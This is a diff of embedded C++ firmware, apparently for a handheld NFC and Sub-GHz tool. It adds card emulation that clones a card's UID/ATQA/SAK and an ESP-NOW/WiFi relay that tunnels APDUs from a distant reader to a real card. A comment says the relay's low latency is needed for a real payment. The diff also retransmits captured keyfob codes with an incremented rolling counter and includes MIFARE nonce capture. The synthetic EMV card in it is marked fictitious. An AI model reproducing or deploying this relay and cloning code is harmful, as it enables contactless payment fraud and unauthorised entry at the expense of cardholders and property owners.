+                                    bool isfsk = false;
+                                    int nn = pp_encode_next(hist[sel].protocol, hist[sel].serial, hist[sel].btn, hist[sel].cnt + 1, cc_raw_pulses, CC_MAX_PULSES, &isfsk);
+                                    if (nn > 0) { cc_isr_stop(); cc_tx_on_capture(cc_raw_pulses, nn, hist[sel], freq_hz, cc_preset_idx, isfsk, 3); }
+                                    else {
+                                        int32_t enc2[256]; int ec = cc_encode_signal(hist[sel], enc2, 256);
+                                        if (ec > 0) { cc_isr_stop(); cc_tx_on_capture(enc2, ec, hist[sel], freq_hz, cc_preset_idx, false, 3); }
+                                    }
+                                    cc_set_raw_rx(); ldraw = true;
+                                }
+                                if (kp('e') || kp('E')) { keyRelease(); cc_hist_log_sd(hist[sel], fhz); sp.fillRect(10, 100, 220, 12, TFT_BLACK); sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(10, 100); sp.print("Saved to captures.csv"); if (use_sprite) sprite->pushSprite(0, 0); delay(600); ldraw = true; }
+                            }
+                            delay(5);
+                        }
+                        fdraw = true;
+                    }
+                    delay(5);
+                }
+            }
+            cc_set_raw_rx();
         }
 
     } // end while(true) sub-menu loop
@@ -43213,6 +46415,7 @@ void nfc_fifo_w(const uint8_t* data, int len) {
 
 int nfc_fifo_r(uint8_t* buf, int max_len) {
     int n = nfc_rr(NFC_FIFO_STA1);
+    n |= ((nfc_rr(NFC_FIFO_STA1 + 1) >> 6) & 0x03) << 8;   // FIFO_STATUS2 b9:b8 -> frames > 255 bytes
     if (n <= 0 || n > max_len) n = min(n, max_len);
     if (n <= 0) return 0;
     nfc_select();
@@ -43244,6 +46447,12 @@ int nfc_raw_fifo_r(uint8_t* buf, int max_len) {
     for (int i = 0; i < n; i++) buf[i] = cc_spi->transfer(0x00);
     return n;
 }
+
+// Logs de debug du relais/NFC (hot-path). 0 = OFF (relais rapide, RTT bas -> requis
+// pour un vrai paiement / RRP). Mettre 1 pour re-tracer les APDU au Proxmark.
+#ifndef RLY_DEBUG
+#define RLY_DEBUG 1
+#endif
 
 uint8_t* nfc_transceive(const uint8_t* tx, int tx_len, int* rx_len, int timeout_ms) {
     static uint8_t rx_buf[512];
@@ -43326,18 +46535,19 @@ uint8_t* nfc_transceive(const uint8_t* tx, int tx_len, int* rx_len, int timeout_
         }
     }
 
-    Serial.printf("[NFC TX] %d bytes, IRQ: main=%02X timer=%02X err=%02X txe=%d rxe=%d\n",
+    if (RLY_DEBUG) Serial.printf("[NFC TX] %d bytes, IRQ: main=%02X timer=%02X err=%02X txe=%d rxe=%d\n",
                   tx_len, last_main, last_timer, last_err, got_txe, got_rxe);
 
     int n = nfc_rr(NFC_FIFO_STA1);
-    if (n > 0 && n <= 512) {
+    n |= ((nfc_rr(NFC_FIFO_STA1 + 1) >> 6) & 0x03) << 8;   // FIFO_STATUS2 b9:b8 : trames > 255 octets
+    if (n > 0 && n <= 512) {                               // (sans ca, une reponse de 256o -> STA1=0 -> "FIFO empty" -> 6F00)
         *rx_len = nfc_fifo_r(rx_buf, min(n, 512));
-        Serial.printf("[NFC RX] %d bytes:", *rx_len);
-        for (int i = 0; i < min(*rx_len, 64); i++) Serial.printf(" %02X", rx_buf[i]);
-        Serial.println();
+        if (RLY_DEBUG) { Serial.printf("[NFC RX] %d bytes:", *rx_len);
+            for (int i = 0; i < min(*rx_len, 64); i++) Serial.printf(" %02X", rx_buf[i]);
+            Serial.println(); }
         return rx_buf;
     }
-    Serial.printf("[NFC RX] FIFO empty (n=%d)\n", n);
+    if (RLY_DEBUG) Serial.printf("[NFC RX] FIFO empty (n=%d)\n", n);
     return NULL;
 }
 
@@ -43357,45 +46567,57 @@ uint8_t* nfc_transceive_apdu(const uint8_t* apdu, int apdu_len, int* rx_len, int
 
     int resp_len;
     uint8_t* resp = nfc_transceive(tx_buf, apdu_len + 1, &resp_len, timeout_ms);
-    nfc_i_block_num ^= 1;  // BUG3 fix: toggle immediately after send
     if (!resp || resp_len < 1) return NULL;
 
-    // Process response: chaining + WTX (matches Raspyjack _iso14443_4.py)
+    // Reassemblage reponse : chainage PICC (I-block M=1 -> R(ACK) -> bloc suivant) + WTX.
+    // Regle block-number ISO14443-4 alignee sur Proxmark iso14_apdu : a CHAQUE I-block (ou
+    // R(ACK)) recu dont le numero == le notre, on toggle le notre ; le R(ACK) qu'on renvoie
+    // porte NOTRE numero (togglé), PAS celui de la carte. (L'ancien code renvoyait le numero
+    // de la carte -> la carte re-renvoyait le meme bloc en boucle -> gros records >256o casses.)
     int result_len = 0;
-    for (int retries = 0; retries < 20 && resp && resp_len >= 1; retries++) {
+    for (int retries = 0; retries < 40 && resp && resp_len >= 1; retries++) {
         uint8_t pcb = resp[0];
+        bool is_iblock = (pcb & 0xC0) == 0x00;         // I-block : b8b7 = 00
+        bool is_rack   = (pcb & 0xD0) == 0x80;         // R-block ACK (bit ACK=0)
+        int  doff      = 1 + ((pcb & 0x08) ? 1 : 0) + ((pcb & 0x04) ? 1 : 0);  // PCB [+CID] [+NAD]
 
-        // I-block with chaining (M=1): more data coming
-        if ((pcb & 0xE2) == 0x02 && (pcb & 0x10)) {
-            int plen = resp_len - 1;
+        // toggle du block-number a la reception (cf Proxmark l.3538-3544)
+        if ((is_iblock || is_rack) && ((pcb & 0x01) == (nfc_i_block_num & 1)))
+            nfc_i_block_num ^= 1;
+
+        // I-block avec chainage (M=1) : accumule puis R(ACK) pour reclamer la suite
+        if (is_iblock && (pcb & 0x10)) {
+            int plen = resp_len - doff - 2;            // strip PCB(+CID/NAD) + CRC (le FIFO garde le CRC)
+            if (plen < 0) plen = 0;
             if (result_len + plen <= (int)sizeof(result_buf))
-                memcpy(result_buf + result_len, resp + 1, plen);
+                memcpy(result_buf + result_len, resp + doff, plen);
             result_len += plen;
-            uint8_t rack = 0xA2 | (pcb & 0x01);
-            Serial.printf("[ISO] CHAIN +%d (total=%d) R(ACK)=%02X\n", plen, result_len, rack);
-            resp = nfc_transceive(&rack, 1, &resp_len, -real_to);  // BUG1 fix: negative = no STOP_ALL
+            uint8_t rack = 0xA2 | (nfc_i_block_num & 1);   // R(ACK) avec NOTRE block-number togglé
+            if (RLY_DEBUG) Serial.printf("[ISO] CHAIN +%d (total=%d) R(ACK)=%02X\n", plen, result_len, rack);
+            resp = nfc_transceive(&rack, 1, &resp_len, -real_to);  // negative = no STOP_ALL
             continue;
         }
 
-        // I-block final (M=0): last or only fragment
-        if ((pcb & 0xE2) == 0x02 && !(pcb & 0x10)) {
-            int plen = resp_len - 1;
+        // I-block final (M=0) : dernier ou unique fragment
+        if (is_iblock && !(pcb & 0x10)) {
+            int plen = resp_len - doff - 2;            // strip PCB(+CID/NAD) + CRC
+            if (plen < 0) plen = 0;
             if (result_len + plen <= (int)sizeof(result_buf))
-                memcpy(result_buf + result_len, resp + 1, plen);
+                memcpy(result_buf + result_len, resp + doff, plen);
             result_len += plen;
             break;
         }
 
-        // S-WTX: card needs more time
+        // S-WTX : la carte demande du temps
         if ((pcb & 0xC0) == 0xC0 && (pcb & 0x30) == 0x30) {
             uint8_t wtxm = (resp_len > 1) ? (resp[1] & 0x3F) : 1;
-            Serial.printf("[ISO] S-WTX (%d)\n", wtxm);
+            if (RLY_DEBUG) Serial.printf("[ISO] S-WTX (%d)\n", wtxm);
             uint8_t wtx_resp[2] = {0xF2, wtxm};
-            resp = nfc_transceive(wtx_resp, 2, &resp_len, -2000);  // BUG1 fix: negative
+            resp = nfc_transceive(wtx_resp, 2, &resp_len, -2000);
             continue;
         }
 
-        Serial.printf("[ISO] PCB:%02X\n", pcb);
+        if (RLY_DEBUG) Serial.printf("[ISO] PCB:%02X\n", pcb);
         break;
     }
 
@@ -45025,6 +48247,691 @@ bool nfc_emulate_uid(const uint8_t* uid, int uid_len, uint16_t atqa, uint8_t sak
 
 // ── NFC Menu (Flipper-style UI with sprite rendering) ──
 
+// ========================= NFC HAT — Card Emulation / Relay (jalon 1) =========================
+// Passive-target NFC-A emulation on ST25R3916. Register sequence ported from Flipper Zero
+// furi_hal_nfc_iso14443a listener (same silicon). Jalon 1: clone a card's UID/ATQA/SAK, let the
+// chip auto-resolve anticollision, and capture the first commands the external reader sends
+// (e.g. RATS 0xE0 for an ISO-DEP reader). Validate with a Proxmark3 in reader mode.
+//   TODO jalon 2: full ISO-DEP listener (RATS/ATS + I/R/S-blocks) with S(WTX) to absorb link latency.
+//   TODO jalon 3: ESP-NOW tunnel A<->B so B relays APDUs to the real card read by A.
+#ifndef NFC_REG_PASSIVE_TGT
+#define NFC_REG_PASSIVE_TGT   0x08   // Passive Target Definition Register
+#endif
+#define NFC_REG_MASK_RX_TMR   0x0F   // Mask Receive Timer Register
+#define NFC_MASK_MAIN_        0x16   // Mask Main IRQ (== NFC_MASK_IRQ)
+#define NFC_MASK_TIMER_       0x17   // Mask Timer/NFC IRQ
+#define NFC_MASK_TARGET_      0x19   // Mask Target IRQ
+#define NFC_IRQ_TIMER_        0x1B   // Timer/NFC IRQ status
+
+// Write the 15-byte passive-target memory area A (identity used for HW auto-anticollision).
+void nfc_write_pta_mem(const uint8_t* buf, int len) {
+    nfc_select();
+    cc_spi->transfer(NFC_PT_A_LOAD);            // 0xA0 = load PT memory A
+    for (int i = 0; i < len; i++) cc_spi->transfer(buf[i]);
+    nfc_deselect();
+}
+
+// Enter ISO14443-A passive-target (card emulation) mode with a cloned identity.
+void nfc_emul_start(const uint8_t* uid, int uid_len, uint16_t atqa, uint8_t sak) {
+    nfc_wr(NFC_OP_CTRL, 0x80 | 0x40 | 0x03);    // en | rx_en | en_fd_auto_efd (field OFF: reader powers us)
+    nfc_wr(NFC_MODE_DEF, 0x80 | 0x08);          // targ | om_iso14443a = 0x88
+    nfc_wr(NFC_REG_PASSIVE_TGT, 0x40 | 0x10 | 0x08 | 0x04); // fdel2|fdel0|d_ac_ap2p|d_212_424_1r
+    nfc_wr(NFC_REG_MASK_RX_TMR, 0x02);
+    nfc_wr(NFC_MASK_MAIN_, 0x00);               // unmask so RXE/EON latch for polling
+    nfc_wr(NFC_MASK_TIMER_, 0x00);
+    nfc_wr(NFC_MASK_TARGET_, 0x00);
+    nfc_cmd(NFC_CMD_STOP_ALL);
+    uint8_t aux = nfc_rr(NFC_AUX_DEF) & ~(0x3 << 4);   // 4- vs 7-byte NFCID length
+    if (uid_len == 7) aux |= (0x1 << 4);
+    nfc_wr(NFC_AUX_DEF, aux);
+    uint8_t pt[15] = {0};                        // PTA mem: UID[0..len], ATQA@10-11, SAK cascade@12-14
+    memcpy(pt, uid, (uid_len > 10 ? 10 : uid_len));
+    pt[10] = atqa & 0xFF;
+    pt[11] = (atqa >> 8) & 0xFF;
+    pt[12] = (uid_len == 4) ? (uint8_t)(sak & ~0x04) : 0x04; // cascade L1
+    pt[13] = sak & ~0x04;                                    // cascade L2
+    pt[14] = sak & ~0x04;                                    // cascade L3
+    nfc_write_pta_mem(pt, 15);
+    nfc_rr(NFC_IRQ_MAIN); nfc_rr(NFC_IRQ_TIMER_); nfc_rr(NFC_IRQ_ERR); nfc_rr(NFC_IRQ_TGT); // clear pending
+    nfc_cmd(NFC_CMD_GOTO_SENSE);                 // 0xCD — arm passive-target logic (Sense/Idle)
+}
+
+// Poll for one frame from the external reader. Returns byte count (0 = nothing within timeout_ms).
+// tgt_irq (optional) accumulates the target IRQ status bits seen (EON=0x80 / EOF=0x40 / WU_A...).
+int nfc_emul_poll(uint8_t* buf, int max_len, int timeout_ms, uint8_t* tgt_irq) {
+    unsigned long deadline = millis() + timeout_ms;
+    while (millis() < deadline) {
+        uint8_t m = nfc_rr(NFC_IRQ_MAIN);
+        uint8_t tg = nfc_rr(NFC_IRQ_TGT);
+        if (tgt_irq) *tgt_irq |= tg;
+        if (m & 0x10) return nfc_fifo_r(buf, max_len);   // RXE = end of receive
+        delay(1);
+    }
+    return 0;
+}
+
+void nfc_emul_stop() {
+    nfc_cmd(NFC_CMD_STOP_ALL);
+    nfc_wr(NFC_MODE_DEF, 0x09);                  // back to NFC-A initiator default
+    nfc_wr(NFC_OP_CTRL, 0x80);
+}
+
+// ================= NFC HAT — ISO-DEP listener (jalon 2) + ESP-NOW relay (jalon 3) =================
+// Relay works at the APDU layer: emulator B strips the reader's I-block PCB, ships the raw APDU to
+// reader-unit A over ESP-NOW; A re-wraps it for the real card (its own block numbering) and ships
+// the APDU response back; B re-wraps it in an I-block for the reader. Each ISO-DEP link is
+// independent, so only application data crosses the radio.  Half-duplex: one APDU in flight.
+
+// ---- Load-modulated TX with CRC (target/emulation mode). Waits for TXE. ----
+bool nfc_emul_tx(const uint8_t* buf, int len) {
+    nfc_cmd(NFC_CMD_CLEAR_FIFO);
+    nfc_fifo_w(buf, len);
+    int txbits = len << 3;
+    nfc_wr(NFC_TX_BYTES1, (txbits >> 8) & 0xFF);
+    nfc_wr(NFC_TX_BYTES1 + 1, txbits & 0xFF);
+    nfc_rr(NFC_IRQ_MAIN);                       // clear stale IRQ
+    nfc_cmd(NFC_CMD_TX_CRC);                    // 0xC4 = transmit with CRC
+    unsigned long dl = millis() + 30;
+    while (millis() < dl) {
+        if (nfc_rr(NFC_IRQ_MAIN) & 0x08) return true;   // TXE
+        delayMicroseconds(80);
+    }
+    return false;
+}
+
+// Reader FSD (max frame it accepts), parsed from RATS. Default 256.
+static int g_reader_fsd = 256;
+int fsd_from_fsdi(uint8_t fsdi) {
+    static const int t[9] = {16,24,32,40,48,64,96,128,256};
+    return t[fsdi > 8 ? 8 : fsdi];
+}
+
+// Send an ISO-DEP response (APDU-level payload) to the reader, chaining into several I-blocks when
+// it exceeds one frame (reader FSD). bn = reader command block-number bit; cid = CID to echo or -1.
+// Card-side chaining: I-block(chaining) -> reader R(ACK) -> next I-block; block number toggles.
+bool nfc_emul_tx_isodep(const uint8_t* payload, int len, uint8_t bn, int cid) {
+    int hdr = 1 + (cid >= 0 ? 1 : 0);
+    int chunk_max = g_reader_fsd - hdr - 2;          // minus PCB(+CID) and CRC
+    if (chunk_max < 8) chunk_max = 8;
+    if (chunk_max > 250) chunk_max = 250;
+    if (len <= chunk_max) {                          // single frame (fast path)
+        uint8_t f[256]; int fi = 0;
+        f[fi++] = 0x02 | (bn & 1) | (cid >= 0 ? 0x08 : 0);
+        if (cid >= 0) f[fi++] = (uint8_t)cid;
+        memcpy(f + fi, payload, len); fi += len;
+        return nfc_emul_tx(f, fi);
+    }
+    int off = 0, idx = 0;
+    while (off < len) {
+        int chunk = len - off; if (chunk > chunk_max) chunk = chunk_max;
+        bool last = (off + chunk >= len);
+        uint8_t curbn = (bn ^ (idx & 1)) & 1;        // toggle per chained block
+        uint8_t f[256]; int fi = 0;
+        f[fi++] = 0x02 | curbn | (cid >= 0 ? 0x08 : 0) | (last ? 0 : 0x10);  // M=1 while chaining
+        if (cid >= 0) f[fi++] = (uint8_t)cid;
+        memcpy(f + fi, payload + off, chunk); fi += chunk;
+        if (!nfc_emul_tx(f, fi)) return false;
+        off += chunk; idx++;
+        if (last) break;
+        uint8_t r[16]; uint8_t irq = 0;              // wait reader R(ACK) before next block
+        int rn = nfc_emul_poll(r, sizeof(r), 500, &irq);
+        if (rn < 1) return false;
+        // r[0] expected R(ACK)=0xA2|curbn ; if R(NAK) or timeout we bail (v1: no retransmit)
+    }
+    return true;
+}
+
+// ---- MIFARE Classic Crypto1 emulation + reader-nonce capture (Phase 2b) ----
+// Included here so it sees c1_*, mf_crypto, NfcCardInfo and the nfc_emul_* target
+// primitives defined above. Additive: no existing NFC path is modified.
+#include "src/nfc_mfemul.h"
+
+// ---- ESP-NOW transport (broadcast, fragmented, half-duplex) ----
+#define RLY_MAGIC   0x5A
+#define RLY_CHAN    1
+#define RLY_CHUNK   230
+#define RLY_T_IDENT 1     // A -> B : cloned card identity (UID/ATQA/SAK/ATS)
+#define RLY_T_REQ   2     // B -> A : APDU command from the external reader
+#define RLY_T_RESP  3     // A -> B : APDU response from the real card
+
+static uint8_t rly_bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+static bool rly_up = false;
+
+static volatile bool rly_ident_ready = false;
+static uint8_t  rly_uid[10]; static uint8_t rly_uid_len = 0;
+static uint16_t rly_atqa = 0; static uint8_t rly_sak = 0;
+static uint8_t  rly_ats[64]; static volatile int rly_ats_len = 0;
+
+static uint8_t  rly_req[600];  static volatile int rly_req_len = 0;  static volatile uint8_t rly_req_seq = 0;  static volatile bool rly_req_ready = false;
+static uint8_t  rly_resp[1024]; static volatile int rly_resp_len = 0; static volatile uint8_t rly_resp_seq = 0; static volatile bool rly_resp_ready = false;
+
+// reassembly scratch (single message in flight thanks to half-duplex)
+static uint8_t rly_asm[1024]; static int rly_asm_len = 0;
+static uint8_t rly_asm_type = 0xFF, rly_asm_seq = 0xFF, rly_asm_total = 0, rly_asm_have = 0;
+
+static void rly_on_recv(const uint8_t* mac, const uint8_t* data, int len) {
+    (void)mac;
+    if (len < 6 || data[0] != RLY_MAGIC) return;
+    uint8_t type = data[1], seq = data[2], fidx = data[3], ftot = data[4], plen = data[5];
+    if (6 + (int)plen > len) return;
+    if (seq != rly_asm_seq || type != rly_asm_type) {   // start of a new message
+        rly_asm_seq = seq; rly_asm_type = type; rly_asm_len = 0; rly_asm_have = 0; rly_asm_total = ftot;
+    }
+    int off = (int)fidx * RLY_CHUNK;
+    if (off + plen <= (int)sizeof(rly_asm)) {
+        memcpy(rly_asm + off, data + 6, plen);
+        if (off + plen > rly_asm_len) rly_asm_len = off + plen;
+    }
+    rly_asm_have++;
+    if (rly_asm_have < rly_asm_total) return;           // more fragments coming
+
+    if (type == RLY_T_IDENT) {
+        int p = 0; uint8_t ul = rly_asm[p++];
+        if (ul <= 10 && rly_asm_len >= ul + 4) {
+            rly_uid_len = ul; memcpy(rly_uid, rly_asm + p, ul); p += ul;
+            rly_atqa = rly_asm[p] | (rly_asm[p+1] << 8); p += 2;
+            rly_sak = rly_asm[p++];
+            int al = rly_asm[p++]; if (al > 64) al = 64;
+            memcpy(rly_ats, rly_asm + p, al); rly_ats_len = al;
+            rly_ident_ready = true;
+        }
+    } else if (type == RLY_T_REQ) {
+        if (rly_asm_len <= (int)sizeof(rly_req)) { memcpy(rly_req, rly_asm, rly_asm_len); rly_req_len = rly_asm_len; rly_req_seq = seq; rly_req_ready = true; }
+    } else if (type == RLY_T_RESP) {
+        if (rly_asm_len <= (int)sizeof(rly_resp)) { memcpy(rly_resp, rly_asm, rly_asm_len); rly_resp_len = rly_asm_len; rly_resp_seq = seq; rly_resp_ready = true; }
+    }
+}
+
+// ---- Transport WiFi/TCP (relais avec un telephone via APK) — ADDITIF ----
+// N'affecte pas le chemin ESP-NOW (dual Cardputer) : actif seulement si rly_transport==1.
+// Le Cardputer est serveur TCP (SoftAP) ; le telephone (APK, lecteur NFC) est client.
+// Meme protocole logique que l'ESP-NOW (IDENT/REQ/RESP) mais 1 trame TCP = 1 message complet.
+static int         rly_transport = 0;      // 0 = ESP-NOW ; 1 = TCP/WiFi (APK)
+static WiFiClient  rly_tcp;                 // socket du telephone
+static volatile bool wifi_rx_run = false;
+
+void wtcp_send(uint8_t type, uint8_t seq, const uint8_t* payload, int len) {
+    if (!rly_tcp.connected()) return;
+    uint8_t hdr[5] = { RLY_MAGIC, type, seq, (uint8_t)((len >> 8) & 0xFF), (uint8_t)(len & 0xFF) };
+    rly_tcp.write(hdr, 5);
+    if (len > 0) rly_tcp.write(payload, len);
+    rly_tcp.flush();
+}
+
+// Lit une trame complete [MAGIC,type,seq,lenHi,lenLo,payload]. Retourne len payload, ou -1.
+int wtcp_read_frame(uint8_t* type, uint8_t* seq, uint8_t* buf, int maxlen, uint32_t to_ms) {
+    uint32_t dl = millis() + to_ms; uint8_t hdr[5]; int got = 0;
+    while (got < 5) {
+        if (millis() > dl) return -1;
+        if (rly_tcp.available()) hdr[got++] = rly_tcp.read();
+        else { if (!rly_tcp.connected()) return -1; delay(1); }
+    }
+    if (hdr[0] != RLY_MAGIC) return -1;
+    *type = hdr[1]; *seq = hdr[2];
+    int len = (hdr[3] << 8) | hdr[4];
+    if (len > maxlen) return -1;
+    int r = 0;
+    while (r < len) {
+        if (millis() > dl) return -1;
+        if (rly_tcp.available()) buf[r++] = rly_tcp.read();
+        else { if (!rly_tcp.connected()) return -1; delay(1); }
+    }
+    return len;
+}
+
+static void rly_send(uint8_t type, uint8_t seq, const uint8_t* payload, int len) {
+    if (rly_transport == 1) { wtcp_send(type, seq, payload, len); return; }   // APK : route TCP
+    int total = (len + RLY_CHUNK - 1) / RLY_CHUNK; if (total <= 0) total = 1;
+    for (int f = 0; f < total; f++) {
+        int off = f * RLY_CHUNK; int plen = len - off;
+        if (plen > RLY_CHUNK) plen = RLY_CHUNK; if (plen < 0) plen = 0;
+        uint8_t pkt[6 + RLY_CHUNK];
+        pkt[0] = RLY_MAGIC; pkt[1] = type; pkt[2] = seq; pkt[3] = f; pkt[4] = total; pkt[5] = plen;
+        if (plen > 0) memcpy(pkt + 6, payload + off, plen);
+        esp_now_send(rly_bcast, pkt, 6 + plen);
+        delayMicroseconds(300);
+    }
+}
+
+static bool rly_begin() {
+    if (rly_up) return true;
+    WiFi.mode(WIFI_STA); WiFi.disconnect();
+    esp_wifi_set_channel(RLY_CHAN, WIFI_SECOND_CHAN_NONE);
+    if (esp_now_init() != ESP_OK) return false;
+    esp_now_register_recv_cb(rly_on_recv);
+    esp_now_peer_info_t peer = {};
+    memcpy(peer.peer_addr, rly_bcast, 6); peer.channel = RLY_CHAN; peer.encrypt = false;
+    esp_now_add_peer(&peer);
+    rly_ident_ready = rly_req_ready = rly_resp_ready = false;
+    rly_up = true; return true;
+}
+static void rly_end() { if (!rly_up) return; esp_now_deinit(); rly_up = false; }
+
+// Tache RX TCP (APK) : lit les trames du telephone et remplit rly_ident/rly_resp — EXACTEMENT
+// comme rly_on_recv (ESP-NOW) le fait apres reassemblage. Permet a relay_service_iblock de
+// fonctionner sans le moindre changement (il attend rly_resp_ready). Additif.
+void wifi_rx_task(void* arg) {
+    static uint8_t fb[1024];
+    while (wifi_rx_run) {
+        uint8_t type = 0, seq = 0;
+        int n = wtcp_read_frame(&type, &seq, fb, sizeof(fb), 400);
+        if (n < 0) { if (!rly_tcp.connected()) { delay(20); } else delay(1); continue; }
+        if (type == RLY_T_IDENT) {
+            int p = 0; uint8_t ul = fb[p++];
+            if (ul <= 10 && n >= ul + 4) {
+                rly_uid_len = ul; memcpy(rly_uid, fb + p, ul); p += ul;
+                rly_atqa = fb[p] | (fb[p+1] << 8); p += 2;
+                rly_sak = fb[p++];
+                int al = fb[p++]; if (al > 64) al = 64;
+                memcpy(rly_ats, fb + p, al); rly_ats_len = al;
+                rly_ident_ready = true;
+            }
+        } else if (type == RLY_T_RESP) {
+            if (n <= (int)sizeof(rly_resp)) { memcpy(rly_resp, fb, n); rly_resp_len = n; rly_resp_seq = seq; rly_resp_ready = true; }
+        }
+    }
+    vTaskDelete(NULL);
+}
+
+// Build the ATS B presents to the reader: prefer the cloned one but force FWI=14 (~4.9s FWT) so the
+// S(WTX) keep-alive comfortably covers the ESP-NOW round trip. Falls back to a generic ISO-DEP ATS.
+int nfc_build_emul_ats(uint8_t* out) {
+    if (rly_ats_len >= 2 && rly_ats_len <= 64) {
+        memcpy(out, rly_ats, rly_ats_len);
+        uint8_t t0 = out[1]; int idx = 2;
+        if (t0 & 0x40) idx++;                              // skip TA1
+        if (t0 & 0x20) { if (idx < rly_ats_len) out[idx] = 0xE0 | (out[idx] & 0x0F); } // TB1: FWI=14
+        return rly_ats_len;
+    }
+    static const uint8_t defats[5] = {0x05, 0x78, 0x80, 0xE0, 0x00}; // TL,T0(TA/TB/TC,FSCI8),TA1,TB1(FWI14),TC1
+    memcpy(out, defats, 5); return 5;
+}
+
+// ================= VirtCard cross-test profiles (no real card needed) =================
+// Each profile presents a distinct identity (UID/ATQA/SAK/ATS) and canned APDU responses,
+// to cross-test the emulation + relay against several card technologies without owning them.
+#define VC_NPROF 4
+const char* vcard_name(int p) {
+    switch (((p % VC_NPROF) + VC_NPROF) % VC_NPROF) {
+        case 0:  return "Mifare 1K";
+        case 1:  return "DESFire EV1";
+        case 2:  return "EMV Visa (tx)";
+        default: return "BigBlob 512B";
+    }
+}
+// Build IDENT payload {uid_len, uid[], atqa_lo, atqa_hi, sak, ats_len, ats[]} for profile p.
+int vcard_ident(int p, uint8_t* id) {
+    p = ((p % VC_NPROF) + VC_NPROF) % VC_NPROF;
+    static const uint8_t u_mf[4] = {0xDE,0xAD,0xBE,0xEF};
+    static const uint8_t u_df[7] = {0x04,0xDE,0x5F,0x12,0x34,0x56,0x78};
+    static const uint8_t u_ev[4] = {0x11,0x22,0x33,0x44};
+    static const uint8_t u_bb[7] = {0x08,0xB1,0x9B,0x10,0x20,0x30,0x40};
+    static const uint8_t ats_df[6] = {0x06,0x75,0x77,0x81,0x02,0x80};
+    static const uint8_t ats_e[5]  = {0x05,0x78,0x80,0xE0,0x00};
+    const uint8_t* uid; int ul; uint16_t atqa; uint8_t sak; const uint8_t* ats; int al;
+    switch (p) {
+        case 0:  uid=u_mf; ul=4; atqa=0x0004; sak=0x08; ats=nullptr; al=0; break; // Mifare (no ISO-DEP)
+        case 1:  uid=u_df; ul=7; atqa=0x0344; sak=0x20; ats=ats_df;  al=6; break; // DESFire EV1
+        case 2:  uid=u_ev; ul=4; atqa=0x0004; sak=0x20; ats=ats_e;   al=5; break; // EMV Visa
+        default: uid=u_bb; ul=7; atqa=0x0344; sak=0x20; ats=ats_e;   al=5; break; // BigBlob
+    }
+    int n = 0;
+    id[n++] = ul; memcpy(id+n, uid, ul); n += ul;
+    id[n++] = atqa & 0xFF; id[n++] = (atqa >> 8) & 0xFF; id[n++] = sak;
+    id[n++] = al; if (al) { memcpy(id+n, ats, al); n += al; }
+    return n;
+}
+// Fully synthetic EMV (Visa) card — 100% FICTITIOUS data. Completes the contactless flow
+// (PPSE -> SELECT AID -> GPO -> READ RECORD -> GENERATE AC) so a lab terminal (PM3 `hf emv`) runs
+// a transaction. Fake PAN 4111..., fake name, and the cryptogram (9F26) is NOT valid (no issuer
+// key) -> declined by any real terminal/issuer. Lab/PM3 only.
+int emv_full_response(const uint8_t* apdu, int alen, uint8_t* out) {
+    if (alen < 2) { out[0]=0x6D; out[1]=0x00; return 2; }
+    uint8_t ins = apdu[1];
+    // SELECT (00 A4 04 00): PPSE vs AID by first data byte
+    if (ins == 0xA4) {
+        uint8_t d0 = (alen >= 6) ? apdu[5] : 0;
+        if (d0 == 0x32) {  // "2PAY.SYS.DDF01" -> PPSE FCI (lists Visa AID)
+            static const uint8_t ppse[] = {
+                0x6F,0x23,0x84,0x0E,0x32,0x50,0x41,0x59,0x2E,0x53,0x59,0x53,0x2E,0x44,0x44,0x46,
+                0x30,0x31,0xA5,0x11,0xBF,0x0C,0x0E,0x61,0x0C,0x4F,0x07,0xA0,0x00,0x00,0x00,0x03,
+                0x10,0x10,0x87,0x01,0x01,0x90,0x00 };
+            memcpy(out, ppse, sizeof(ppse)); return (int)sizeof(ppse);
+        }
+        // SELECT AID -> app FCI: DF Name, "VISA CREDIT", priority
+        static const uint8_t aidfci[] = {
+            0x6F,0x1B,0x84,0x07,0xA0,0x00,0x00,0x00,0x03,0x10,0x10,0xA5,0x10,
+            0x50,0x0B,0x56,0x49,0x53,0x41,0x20,0x43,0x52,0x45,0x44,0x49,0x54,0x87,0x01,0x01,
+            0x90,0x00 };
+        memcpy(out, aidfci, sizeof(aidfci)); return (int)sizeof(aidfci);
+    }
+    // GET PROCESSING OPTIONS (80 A8): AIP + AFL (SFI1 rec1)
+    if (ins == 0xA8) {
+        static const uint8_t gpo[] = { 0x80,0x06,0x00,0x00,0x08,0x01,0x01,0x00,0x90,0x00 };
+        memcpy(out, gpo, sizeof(gpo)); return (int)sizeof(gpo);
+    }
+    // READ RECORD (00 B2): the application record (Track2, PAN, name, expiry, CDOL1/2)
+    if (ins == 0xB2) {
+        static const uint8_t rec[] = {
+            0x70,0x57,
+            0x57,0x10,0x41,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0xD3,0x01,0x22,0x01,0x00,0x00,0x00,0x0F,
+            0x5A,0x08,0x41,0x11,0x11,0x11,0x11,0x11,0x11,0x11,
+            0x5F,0x24,0x03,0x30,0x12,0x31,
+            0x5F,0x20,0x0F,0x46,0x49,0x43,0x54,0x49,0x54,0x49,0x4F,0x55,0x53,0x20,0x43,0x41,0x52,0x44,
+            0x5F,0x34,0x01,0x00,
+            0x8C,0x15,0x9F,0x02,0x06,0x9F,0x03,0x06,0x9F,0x1A,0x02,0x95,0x05,0x5F,0x2A,0x02,0x9A,0x03,0x9C,0x01,0x9F,0x37,0x04,
+            0x8D,0x06,0x91,0x0A,0x8A,0x02,0x95,0x05,
+            0x90,0x00 };
+        memcpy(out, rec, sizeof(rec)); return (int)sizeof(rec);
+    }
+    // GENERATE AC (80 AE): fictitious cryptogram (TC = "offline approved" for the lab demo)
+    if (ins == 0xAE) {
+        static const uint8_t ac[] = {
+            0x77,0x1E,
+            0x9F,0x27,0x01,0x40,
+            0x9F,0x36,0x02,0x00,0x01,
+            0x9F,0x26,0x08,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,
+            0x9F,0x10,0x07,0x06,0x01,0x0A,0x03,0xA0,0x00,0x00,
+            0x90,0x00 };
+        memcpy(out, ac, sizeof(ac)); return (int)sizeof(ac);
+    }
+    out[0]=0x90; out[1]=0x00; return 2;   // default OK
+}
+
+// Build a canned response for an APDU under profile p. Returns length.
+int vcard_response(int p, const uint8_t* apdu, int alen, uint8_t* out) {
+    p = ((p % VC_NPROF) + VC_NPROF) % VC_NPROF;
